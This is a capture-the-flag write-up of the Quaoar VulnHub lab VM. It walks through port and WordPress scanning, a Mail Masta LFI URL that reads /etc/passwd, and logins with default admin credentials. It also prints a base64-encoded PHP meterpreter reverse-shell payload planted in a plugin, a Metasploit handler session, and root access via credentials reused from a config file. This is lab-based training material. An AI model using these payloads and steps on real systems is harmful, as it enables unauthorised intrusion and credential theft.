# Quaoar Vulnhub

## Enumeration 

### NMAP

Basic Scan 
```shell
root@kali:~# nmap -F 192.168.43.149
Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-01-05 13:04 EST
Nmap scan report for Quaoar (192.168.43.149)
Host is up (0.00019s latency).
Not shown: 91 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 08:00:27:ED:22:66 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
``` 

Aggressive Scan 
```shell
root@kali:~# nmap -A -O -sV 192.168.43.149
Starting Nmap 7.70SVN ( https://nmap.org ) at 2019-01-05 13:11 EST
Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.91% done; ETC: 13:13 (0:00:00 remaining)
Nmap scan report for Quaoar (192.168.43.149)
Host is up (0.00044s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  ssl/http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3?
|_pop3-capabilities: ERROR: Script execution failed (use -d to debug)
|_pop3-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2019-01-05T18:14:12+00:00; 0s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_ssl-date: 2019-01-05T18:14:13+00:00; +1s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl         OpenSSL (SSLv3)
|_ssl-date: 2019-01-05T18:14:09+00:00; 0s from scanner time.
995/tcp open  ssl         OpenSSL (SSLv3)
MAC Address: 08:00:27:ED:22:66 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h14m09s, median: 0s
|_nbstat: ERROR: Script execution failed (use -d to debug)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   Computer name: Quaoar
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: Quaoar
|_  System time: 2019-01-05T13:13:44-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms Quaoar (192.168.43.149)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.80 seconds
```
### WPSCAN

```shell
root@kali:~# wpscan -u http://192.168.43.149/wordpress/ --enumerate
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________


[i] It seems like you have not updated the database for some time
[i] Last database update: 2018-12-05
[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > y
[i] Updating the Database ...
[i] Update completed
[+] URL: http://192.168.43.149/wordpress/
[+] Started: Sat Jan  5 13:22:34 2019

[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.43.149/wordpress/xmlrpc.php   [HTTP 200]
[+] Found an RSS Feed: /wordpress/?feed=rss2   [HTTP 0]
[!] Upload directory has directory listing enabled: http://192.168.43.149/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.43.149/wordpress/wp-includes/

[+] Enumerating WordPress version ...
[!] The WordPress 'http://192.168.43.149/wordpress/readme.html' file exists exposing a version number

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 36 vulnerabilities identified from the version number

=======================================================Snippet=====================================
[+] Name: mail-masta - v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2014-09-19T07:52:00.000Z
 |  Location: http://192.168.43.149/wordpress/wp-content/plugins/mail-masta/
 |  Readme: http://192.168.43.149/wordpress/wp-content/plugins/mail-masta/readme.txt
[!] Directory listing is enabled: http://192.168.43.149/wordpress/wp-content/plugins/mail-masta/

[!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
    Reference: https://wpvulndb.com/vulnerabilities/8609
    Reference: https://cxsecurity.com/issue/WLB-2016080220
    Reference: https://www.exploit-db.com/exploits/40290/

[!] Title: Mail Masta 1.0 - Multiple SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8740
    Reference: https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:00 <=========================> (288 / 288) 100.00% Time: 00:00:00

[+] No themes found

[+] Enumerating timthumb files ...

   Time: 00:00:07 <=======================> (2574 / 2574) 100.00% Time: 00:00:07

[+] No timthumb files found

[+] Enumerating usernames ...
[+] We identified the following 2 users:
    +----+--------+--------+
    | ID | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username 'admin' is still used

[+] Finished: Sat Jan  5 13:22:58 2019
[+] Elapsed time: 00:00:24
[+] Requests made: 4644
[+] Memory used: 52.02 MB
```
So There is LFI in **Mail Masta** to exploit it here is PoC https://www.exploit-db.com/exploits/40290/

```text
Visiting this Link http://192.168.43.149/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

### CMSMap

```shell
root@kali:~/Desktop/Tools/CMSmap# ./cmsmap.py http://192.168.43.149/wordpress/
[-] Date & Time: 05/01/2019 13:21:16
[I] Threads: 5
[-] Target: http://192.168.43.149/wordpress (192.168.43.149)
[M] Website Not in HTTPS: http://192.168.43.149/wordpress
[I] Server: Apache/2.2.22 (Ubuntu)
[I] X-Powered-By: PHP/5.3.10-1ubuntu3
[L] X-Frame-Options: Not Enforced
[I] Strict-Transport-Security: Not Enforced
[I] X-Content-Security-Policy: Not Enforced
[I] X-Content-Type-Options: Not Enforced
[L] No Robots.txt Found
[I] CMS Detection: WordPress
[I] Wordpress Version: 3.9.14
[I] Wordpress Theme: twentyfourteen
[H] Configuration File Found: http://192.168.43.149/wordpress/wp-config
[-] WordPress usernames identified: 
[M] admin
[M] wpuser
[M] XML-RPC services are enabled
[H] Valid ADMIN Credentials! Username: admin Password: admin
[H] Valid ADMIN Credentials! Username: admin Password: admin
[H] Valid Credentials! Username: wpuser Password: wpuser
[M] Website vulnerable to XML-RPC Brute Force Vulnerability
[M] Website vulnerable to XML-RPC Amplification Brute Force Vulnerability
[I] Forgotten Password Allows Username Enumeration: http://192.168.43.149/wordpress/wp-login.php?action=lostpassword
[I] Autocomplete Off Not Found: http://192.168.43.149/wordpress/wp-login.php
[-] Default WordPress Files:
[-] Searching Wordpress Plugins ...
[I] akismet v3.0.1
[M]  EDB-ID: 37826 "WordPress 3.4.2 - Multiple Path Disclosure Vulnerabilities"
[M]  EDB-ID: 37902 "WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities"
[I] mail-masta v1.0
[M]  EDB-ID: 40290 "WordPress Plugin Mail Masta 1.0 - Local File Inclusion"
[M]  EDB-ID: 41438 "WordPress Plugin Mail Masta 1.0 - SQL Injection"
[I] Checking for Directory Listing Enabled ...
[L] http://192.168.43.149/wordpress/wp-content/plugins/mail-masta
[-] Date & Time: 05/01/2019 13:58:23
[-] Completed in: 0:37:06
```
so the Admin Creds is "admin:admin" as per CMS MAP 

Lets Pop our shell 

## Exploitation 

### Generating PHP Base 64 Shell
```shell
root@kali:~/Desktop/Tools/CMSmap# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.83 LPORT=443 -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNDMuODMnOyAkcG9ydCA9IDQ0MzsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
```
### Setting up the Handler 

```shell
msf > use exploit/multi/handler 
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST eth0
LHOST => eth0
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.43.83:443 
[*] Sending stage (37775 bytes) to 192.168.43.149
[*] Meterpreter session 1 opened (192.168.43.83:443 -> 192.168.43.149:44904) at 2019-01-05 15:34:16 -0500
```
add this to any wordpress plugin and make sure its **active** 

we have popped a shell 

## POST Exploitation / Privilege Escalation 

Getting User Flag 
```shell
meterpreter > ls
Listing: /home/wpadmin
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  33    fil   2016-10-22 12:54:00 -0400  flag.txt

meterpreter > cat flag.txt
2bafe61f03117ac66a73c3c514de796e
```
Lets do some Kernel Enumeration 

```shell
meterpreter > shell
Process 13760 created.
Channel 1 created.
python -c "import pty; pty.spawn('/bin/bash')"
www-data@Quaoar:/home/wpadmin$ uname -a 
uname -a 
Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
www-data@Quaoar:/home/wpadmin$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```
Reading Wordpress Config File 
```shell
www-data@Quaoar:/tmp$ locate config.php
locate config.php
/var/www/upload/config.php
/var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php
/var/www/wordpress/wp-config.php
/var/www/wordpress/wp-admin/setup-config.php
/var/www/wordpress/wp-content/plugins/akismet/views/config.php
www-data@Quaoar:/tmp$ cat /var/www/upload/config.php
```
I Found these Important Info 
```php
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'rootpassword!');

```
Maybe they are the SSH Creds since it is using Root 
```shell
root@kali:~/Desktop/Tools/Burp2.0# ssh root@192.168.43.149
The authenticity of host '192.168.43.149 (192.168.43.149)' can't be established.
ECDSA key fingerprint is SHA256:+ODdJgfptUyyVzKI9wDm804SlXxzmb4/BiKsHCnHGeg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.43.149' (ECDSA) to the list of known hosts.
root@192.168.43.149's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat Jan  5 16:54:47 EST 2019

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jan 15 11:23:45 2017 from desktop-g0lhb7o.snolet.com
root@Quaoar:~# ls
flag.txt  vmware-tools-distrib
root@Quaoar:~# cat flag.txt 
8e3f9ec016e3598c5eec11fd3d73f6fb
```
and There you go :D 

# Happy Hacking 
